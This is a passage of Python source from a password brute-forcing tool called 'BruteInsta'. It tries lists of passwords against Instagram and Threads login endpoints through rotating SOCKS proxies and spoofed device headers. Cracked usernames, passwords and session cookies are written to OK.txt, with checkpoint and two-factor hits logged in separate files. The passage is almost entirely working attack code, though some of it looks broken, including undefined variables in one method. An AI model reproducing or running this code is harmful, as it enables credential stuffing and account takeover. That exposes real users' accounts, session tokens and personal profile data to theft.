                              Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}users_id{P2}: {P2}{uidx}\n  {H2}fullname{P2}: {fulmmnn}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}biogrphy{P2}: {bio}\n  {H2}mutualss{P2}: {mutual}\n  {H2}privates{P2}: {private}\n  {H2}verifeed{P2}: {verifs}\n  {H2}fbuserid{P2}: {fbid}\n  {H2}category{P2}: {ctasu}\n  {H2}biolinks{P2}: {bioasu}\n  {H2}reel_vid{P2}: {timelines}\n  {H2}business{P2}: {busi}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}\n  {H2}urprofil{P2}: {N2}{pict}''')
                              save = f'{user}|{pswd}|{cookie}\n'
                          except Exception as e:
                                 print('\r                                                                        ')
                                 Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       else:                            
                            print('\r                                                                        ')
                            Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                            save = f'{user}|{pswd}|{cookie}\n'
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       break
                   elif 'two_factor_required' in str(resp.text):
                        followers, following, postingan, fulxxnam = self.friends_user(user)
                        print('\r                                                                        ')
                        Console().print(f'''\r {M2}two_factor_required          \n\n  {M2}fullname{P2}: {fulxxnam}\n  {M2}username{P2}: {A2}{user}\n  {M2}password{P2}: {A2}{pswd}\n  {M2}follower{P2}: {followers}\n  {M2}followed{P2}: {following}\n  {M2}feedpost{P2}: {postingan}\n  {M2}userAgnt{P2}: {A2}{uaig}''')
                        self.tw +=1
                        open(file+'2F.txt','a', encoding='utf-8').write(f'{user}|{pswd}\n')
                        break
                   elif 'https://i.instagram.com/challenge/' in str(resp.text):
                        followers, following, postingan, fulxxnam = self.friends_user(user)
                        print('\r                                                                        ')
                        Console().print(f'''\r {K2}checkpoint_required          \n\n  {K2}fullname{P2}: {fulxxnam}\n  {K2}username{P2}: {A2}{user}\n  {K2}password{P2}: {A2}{pswd}\n  {K2}follower{P2}: {followers}\n  {K2}followed{P2}: {following}\n  {K2}feedpost{P2}: {postingan}\n  {K2}userAgnt{P2}: {A2}{uaig}''')
                        self.cp +=1
                        open(file+'CP.txt','a', encoding='utf-8').write(f'{user}|{pswd}\n')
                        break
               except requests.exceptions.ConnectionError as e:
                   time.sleep(10) ; self.ExecLogin(user, passwd, allData_akun, file='data/termux/internal/')
        self.lp +=1

    def ExecAjax(self, user, password, allData_akun=None, file='data/termux/internal/'):
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.getUserAgentt()
        Console().print(f'   {P2}({H2}●{P2}) BruteInsta : {H2}BruteForce{P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        while True:
            try:
                headers = {
                    "Host": "www.i.instagram.com",
                    "content-length": "0",
                    "sec-ch-ua": '"Chromium";v="111", "Not(A:Brand";v="9"',
                    "x-ig-www-claim": "hmac.AR1wempl8NtDUxtfJo2Exrxwzw4RgnY75ymbTvyecb-M5RB4",
                    "sec-ch-ua-platform-version": '"10.0.0"',
                    "x-requested-with": "XMLHttpRequest",
                    "dpr": "1.4375",
                    "sec-ch-ua-full-version-list": '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
                    "x-csrftoken": byps.cookies['csrftoken'],
                    "sec-ch-ua-model": '"OnePlus7Pro"',
                    "sec-ch-ua-platform": '"Android"',
                    "x-ig-app-id": "1217981644879628",
                    "sec-ch-prefers-color-scheme": "light",
                    "sec-ch-ua-mobile": "?1",
                    "x-instagram-ajax": "1011994383",
                    "user-agent": uaig,
                    "viewport-width": "501",
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "x-asbd-id": "129477",
                    "origin": "https://www.instagram.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.instagram.com/oauth/oidc/v2?redirect_uri=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness%2Floginpage%2Figoidc%2Fcallback%2Fidtoken%2F&app_id=532380490911317&response_type=code&scope=openid&state=%7B%22user_nonce%22%3A%22ATA49RzWDRydRCyQ3omVT0YiRemKUAUyRQgHerrLPMultUtLeHXlGSYbood3CWfLlFa1csOHxnp_I3Ufeg28Cy3lvXYKcnHP1kcoP7rB%22%2C%22from_ig_login_upsell_sso%22%3Anull%2C%22login_source%22%3A%22fbs_web_landing_page%22%2C%22next%22%3A%22%5Cu00252F%5Cu00253Fnav_ref%5Cu00253Dbizweb_landing_ig_login_button%5Cu002526biz_login_source%5Cu00253Dbizweb_landing_login_ig_oidc_w_pc_login_button%22%2C%22require_professional%22%3Atrue%2C%22create_business_manager%22%3Atrue%7D&logger_id=4dd88fb7-0a40-4b28-9691-35a007c58d98",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                payload = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),'RecodeLuYa'),'optIntoOneTap':'false','queryParams':json.dumps({"force_authentication":"1","platform_app_id":"532380490911317","next":"/oauth/oidc/?redirect_uri=https://business.facebook.com/business/loginpage/igoidc/callback/idtoken/&app_id=532380490911317&response_type=code&scope=openid&state=%7B%22user_nonce%22:%22ATA49RzWDRydRCyQ3omVT0YiRemKUAUyRQgHerrLPMultUtLeHXlGSYbood3CWfLlFa1csOHxnp_I3Ufeg28Cy3lvXYKcnHP1kcoP7rB%22,%22from_ig_login_upsell_sso%22:null,%22login_source%22:%22fbs_web_landing_page%22,%22next%22:%22%5Cu00252F%5Cu00253Fnav_ref%5Cu00253Dbizweb_landing_ig_login_button%5Cu002526biz_login_source%5Cu00253Dbizweb_landing_login_ig_oidc_w_pc_login_button%22,%22require_professional%22:true,%22create_business_manager%22:true%7D&logger_id=4dd88fb7-0a40-4b28-9691-35a007c58d98","oneTapUsers":"[\"3421292205\"]"}),'trustedDeviceRecords':'{}','username':user}
                cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                break
            except:pass
        for pswd in password:
            if pswd:
               try:
                  payload.update({'enc_password':'#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),pswd)})
                  payload2 = urllib.parse.urlencode(payload)
                  proxies1 = {'http': 'socks4://' + random.choice(prox)}
                  response = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies = {'cookie':cookies}, data = payload2, headers = headers, proxies = proxies1).text
                  if "userId" in str(response) or "sessionid" in byps.cookies.get_dict():
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan, fulxxnam = self.friends_user(user)
                       if allData_akun is not None:
                          try:
                              followers, following, postingan, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, timelines, busi, ctasu, bioasu = self.all_dateee(user)
                              print('\r                                                                        ')
                              Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}users_id{P2}: {P2}{uidx}\n  {H2}fullname{P2}: {fulmmnn}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}biogrphy{P2}: {bio}\n  {H2}mutualss{P2}: {mutual}\n  {H2}privates{P2}: {private}\n  {H2}verifeed{P2}: {verifs}\n  {H2}fbuserid{P2}: {fbid}\n  {H2}category{P2}: {ctasu}\n  {H2}biolinks{P2}: {bioasu}\n  {H2}reel_vid{P2}: {timelines}\n  {H2}business{P2}: {busi}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}\n  {H2}urprofil{P2}: {N2}{pict}''')
                              save = f'{user}|{pswd}|{cookie}\n'
                          except Exception as e:
                                 print('\r                                                                        ')
                                 Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       else:
                            print('\r                                                                        ')
                            Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       break
               except requests.exceptions.ConnectionError as e:
                  time.sleep(10) ; self.ExecAjax(user, password, allData_akun, file='data/termux/internal/')
        self.lp +=1

    def ExecThreads(self, user, password, allData_akun = None, file='data/termux/internal/'):
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.getUserAgentt()
        curl = byps.get('https://www.threads.net/login').text
        Console().print(f'   {P2}({H2}●{P2}) BruteInsta : {H2}BruteForce{P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        while True:
            try:
                headers = {}
                csrftoken, mid = re.search('{"csrf_token":"(.*?)"', str(curl)).group(1),re.search('{"mid":{"value":"(.*?)"',str(curl)).group(1)
                headers.update({
                    "Host": "www.threads.net",
                    "content-length": "318",
                    "sec-ch-ua": '"Chromium";v="111", "Not(A:Brand";v="8"',
                    "sec-ch-ua-model": '"CPH2127"',
                    "x-ig-app-id": "1412234116260832",
                    "sec-ch-ua-mobile": "?1",
                    "x-instagram-ajax": "0",
                    "user-agent": uaig,
                    "viewport-width": "501",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "sec-ch-ua-platform-version": '"12.0.0"',
                    "x-asbd-id": "129477",
                    "dpr": "1.4375",
                    "sec-ch-ua-full-version-list": '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
                    "sec-ch-prefers-color-scheme": "light",
                    "x-csrftoken": csrftoken,
                    "sec-ch-ua-platform": '"Android"',
                    "accept": "*/*",
                    "origin": "https://www.threads.net",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.threads.net/login",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                })
                payload = {
                    'enc_password':'#PWD_INSTAGRAM_BROWSER:10:1701518720:RecodeTerusDiJualOm!',
                    'optIntoOneTap':'false',
                    'queryParams':'{}',
                    'stopDeletionNonce':'',
                    'textAppStopDeletionToken':'',
                    'username':'JhonChenXU'
                }
                break
            except requests.exceptions.ConnectionError as e:
                time.sleep(5)
                self.ExecThreads(user, password, allData_akun, file='data/termux/internal/')
            except:pass
        for pswd in password:
            if pswd:
               try:
                   payload.update({'enc_password':'#PWD_INSTAGRAM_BROWSER:0:%s:%s'%(int(time.time()), pswd),'username': user})
                   cookies   = {'cookie': f'dpr=2;mid={mid};cb=1_2023_11_29_;csrftoken={csrftoken}'}
                   signature = urllib.parse.urlencode(payload)
                   proxies1 = {'http': 'socks5://' + random.choice(prox)}
                   response  = byps.post('https://www.threads.net/api/v1/web/accounts/login/ajax/', data = signature, headers = headers, cookies = cookies).text
                   if "userId" in response or "sessionid" in byps.cookies.get_dict():
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan, fulxxnam = self.friends_user(user)
                       if allData_akun is not None:
                          try:
                              followers, following, postingan, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, timelines, busi, ctasu, bioasu = self.all_dateee(user)
                              print('\r                                                                        ')
                              Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}users_id{P2}: {P2}{uidx}\n  {H2}fullname{P2}: {fulmmnn}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}biogrphy{P2}: {bio}\n  {H2}mutualss{P2}: {mutual}\n  {H2}privates{P2}: {private}\n  {H2}verifeed{P2}: {verifs}\n  {H2}fbuserid{P2}: {fbid}\n  {H2}category{P2}: {ctasu}\n  {H2}biolinks{P2}: {bioasu}\n  {H2}reel_vid{P2}: {timelines}\n  {H2}business{P2}: {busi}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}\n  {H2}urprofil{P2}: {N2}{pict}''')
                              save = f'{user}|{pswd}|{cookie}\n'
                          except Exception as e:
                                 print('\r                                                                        ')
                                 Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                                 save = f'{user}|{pswd}|{cookie}\n'
                       else:
                            print('\r                                                                        ')
                            Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       break
               except requests.exceptions.ConnectionError:
                   time.sleep(5)
                   self.ExecThreads(user, password, allData_akun ,file='data/termux/internal/')
        self.lp +=1
    
    def api_vjs(self, user, password, allData_akun=None, file='data/termux/internal/'):
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.UserAgent()
        Console().print(f'   {P2}({H2}●{P2}) BruteInsta : {H2}BruteForce{P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        for pswd in password:
            try:
                 resp = byps.get('https://www.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
                 prok = {'http': 'socks5://' + random.choice(prox)}
                 data = json.dumps({'phone_id': requ.poid(),'device_id': requ.DeviceId(),'guid': requ.guid(),'username': user,'password': pswd})
                 headers = {'Authority': 'api.instagram.com','Content-type': 'application/x-www-form-urlencoded; charset=UTF-8','X-IG-Connection-Speed': f'{random.randint(100, 999)}kbps','Accept': '*/*','X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),'X-IG-App-ID': '936619743392459','Accept-Language': 'id-ID','X-IG-ABR-Connection-Speed-KBPS': '0','User-Agent': uaig,'Connection': 'keep-alive','X-IG-Capabilities': '36r/dw==','Cookie': f'csrftoken={resp.cookies.get("csrftoken")};mid={resp.cookies.get("mid")};dpr=2'}
                 cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                 byps.headers.update({'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
                 resp_data = requ.Signature(data)
                 response = byps.post('https://i.instagram.com/api/v1/accounts/login/', data = resp_data, headers = headers, cookies = {'cookie':cookies}, proxies = prok)
                 if 'logged_in_user' in str(response.text):
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan, fulxxnam = self.friends_user(user)
                       if allData_akun is not None:
                          try:
                              followers, following, postingan, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, timelines, busi, ctasu, bioasu = self.all_dateee(user)
                              print('\r                                                                        ')
                              Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}users_id{P2}: {P2}{uidx}\n  {H2}fullname{P2}: {fulmmnn}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}biogrphy{P2}: {bio}\n  {H2}mutualss{P2}: {mutual}\n  {H2}privates{P2}: {private}\n  {H2}verifeed{P2}: {verifs}\n  {H2}fbuserid{P2}: {fbid}\n  {H2}category{P2}: {ctasu}\n  {H2}biolinks{P2}: {bioasu}\n  {H2}reel_vid{P2}: {timelines}\n  {H2}business{P2}: {busi}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}\n  {H2}urprofil{P2}: {N2}{pict}''')
                              save = f'{user}|{pswd}|{cookie}\n'
                          except Exception as e:
                                 print('\r                                                                        ')
                                 Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       else:
                            print('\r                                                                        ')
                            Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       break
            except requests.exceptions.ConnectionError as e:
               time.sleep(10) ; self.api_vjs(user, password, allData_akun, file='data/termux/internal/')
        self.lp +=1
    
    def testingapi(self, user, password, allData_akun=None, file='data/termux/internal/'):
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.getUserAgentt()
        Console().print(f'   {P2}({H2}●{P2}) BruteInsta : {H2}BruteForce{P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        for pswd in password:
            try:
                 s.headers.update({
                      'x-ig-app-locale': 'in_ID',
                      'x-ig-device-locale': 'in_ID',
                      'x-ig-mapped-locale': 'id_ID',
                      'x-pigeon-session-id': 'UFS-%s-1'%(str(uuid.uuid4())),
                      'x-pigeon-rawclienttime': str(round(time.time() * 1000)),
                      'x-ig-bandwidth-speed-kbps': str(random.randint(7000, 10000)),
                      'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
                      'x-ig-bandwidth-totaltime-ms': str(random.randint(50, 150)),
                      'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                      'x-ig-www-claim': '0',
                      'x-bloks-is-layout-rtl': 'false',
                      'x-ig-device-id': str(uuid.uuid4()),
                      'x-ig-family-device-id': str(uuid.uuid4()),
                      'x-ig-android-id': f'android-{self.Android_ID(user,pswd).hexdigest()[:16]}',
                      'x-ig-timezone-offset': '25200',
                      'x-fb-connection-type': 'WIFI',
                      'x-ig-connection-type': 'WIFI',
                      'x-ig-capabilities': '3brTv10=',
                      'x-ig-app-id': '567067343352427',
                      'priority': 'u=3',
                      'user-agent': 'Instagram 345.0.0.48.95 Android (25/7.1.2; 240dpi; 720x1280; samsung; SM-N976N; dream2qltechn; qcom; in_ID; 458229257)',
                      'accept-language': 'id-ID, en-US',
                      'x-mid': 'ZeIE4QABAAGf-6PwjyUtXSbTGmOz',
                      'ig-intended-user-id': '0',
                      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                      'content-length': '2759',
                      'x-fb-http-engine': 'Liger',
                      'x-fb-client-ip': 'True',
                      'x-fb-server-cluster': 'True'}
                 )
                 self.username_to_id = 'nipten:33'
                 self.username_to_pw = 'nipten:73'
                 self.encr = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), pswd)
                 self.Poke = 'params={"client_input_params":{"password":"'+ str(self.encr) +'","contact_point":"'+ str(user) +'","fb_ig_device_id":[],"event_flow":"login_manual","openid_tokens":{},"machine_id":"'+ str(s.headers.get('x-mid')) +'","family_device_id":"'+ str(uuid.uuid4()) +'","accounts_list":[],"try_num":3,"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+ str(s.headers.get('x-ig-android-id')) +'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","sso_token_map_json_string":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"client_known_key_hash":"","event_step":"home_page","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":1,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","qe_device_id":"'+ str(uuid.uuid4()) +'","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+ str(uuid.uuid4()) +'","reg_flow_source":"login_home_native_integration_point","credential_type":"password","waterfall_id":"'+ str(uuid.uuid4()) +'","username_text_input_id":"'+ str(self.username_to_id) +'","password_text_input_id":"'+ str(self.username_to_pw) +'","offline_experiment_group":"caa_launch_ig4a_combined_60_percent","INTERNAL_INFRA_THEME":"default","INTERNAL__latency_qpl_instance_id":133301795800138,"device_id":"'+ str(s.headers.get('x-ig-android-id'))+'","server_login_source":"login","login_source":"Login","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"login_home_page","INTERNAL__latency_qpl_marker_id":36707139}}&bk_client_context={"bloks_version":"8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb","styles_id":"instagram"}&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb'
                 self.Logn = s.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = self.Poke)
                 if 'logged_in_user' in str(self.Logn.text):
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan, fulxxnam = self.friends_user(user)
                       if allData_akun is not None:
                          try:
                              followers, following, postingan, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, timelines, busi, ctasu, bioasu = self.all_dateee(user)
                              print('\r                                                                        ')
                              Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}users_id{P2}: {P2}{uidx}\n  {H2}fullname{P2}: {fulmmnn}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}biogrphy{P2}: {bio}\n  {H2}mutualss{P2}: {mutual}\n  {H2}privates{P2}: {private}\n  {H2}verifeed{P2}: {verifs}\n  {H2}fbuserid{P2}: {fbid}\n  {H2}category{P2}: {ctasu}\n  {H2}biolinks{P2}: {bioasu}\n  {H2}reel_vid{P2}: {timelines}\n  {H2}business{P2}: {busi}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}\n  {H2}urprofil{P2}: {N2}{pict}''')
                              save = f'{user}|{pswd}|{cookie}\n'
                          except Exception as e:
                                 print('\r                                                                        ')
                                 Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       else:
                            print('\r                                                                        ')
                            Console().print(f'''\r {H2}logged_in_user          \n\n  {H2}fullname{P2}: {fulxxnam}\n  {H2}username{P2}: {A2}{user}\n  {H2}password{P2}: {A2}{pswd}\n  {H2}follower{P2}: {followers}\n  {H2}followed{P2}: {following}\n  {H2}feedpost{P2}: {postingan}\n  {H2}saved_as{P2}: data/result/{H2}{hari_save}\n  {H2}csrtoken{P2}: {A2}{cookie}\n  {H2}bearbers{P2}: {A2}{response.headers.get('ig-set-authorization')}\n  {H2}userAgnt{P2}: {A2}{uaig}''''')
                       with open(file+'OK.txt','a',encoding='utf-8') as sv:
                          sv.write(save)
                          sv.close()
                       break
            except requests.exceptions.ConnectionError as e:
               time.sleep(10) ; self.api_vjs2(user, password, allData_akun, file='data/termux/internal/')
        self.lp +=1
    
    def api_vjs2(self, user, password, allData_akun=None, file='data/termux/internal/'):
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.getUserAgentt()
        Console().print(f'   {P2}({H2}●{P2}) BruteInsta : {H2}BruteForce{P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        for pswd in password:
            try:
                 resp = byps.get('https://www.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
                 prok = {'http': 'socks5://' + random.choice(prox)}
                 data = json.dumps({'phone_id': requ.poid(),'_csrftoken': resp.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),'username': user,'guid': requ.guid(),'device_id': requ.DeviceId(),'password': pswd,'login_attempt_count': '0'})
                 headers = {'Authority': 'api.instagram.com','Content-type': 'application/x-www-form-urlencoded; charset=UTF-8','X-IG-Connection-Speed': f'{random.randint(100, 999)}kbps','Accept': '*/*','X-IG-Connection-Type': random.choice(['MOBILE(LTE)', 'WIFI']),'X-IG-App-ID': '936619743392459','Accept-Language': 'id-ID','X-IG-ABR-Connection-Speed-KBPS': '0','User-Agent': uaig,'Connection': 'keep-alive','X-IG-Capabilities': '36r/dw==','Cookie': f'csrftoken={resp.cookies.get("csrftoken")};mid={resp.cookies.get("mid")};dpr=2'}
                 cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                 byps.headers.update({'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'})
                 resp_data = requ.Signature(data)
                 response = byps.post('https://www.instagram.com/api/v1/accounts/login/', data = resp_data, headers = headers, cookies = {'cookie':cookies}, proxies = prok)
                 if 'logged_in_user' in str(response.text):
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan, fulxxnam = self.friends_user(user)
                       if allData_akun is not None:
                          try:
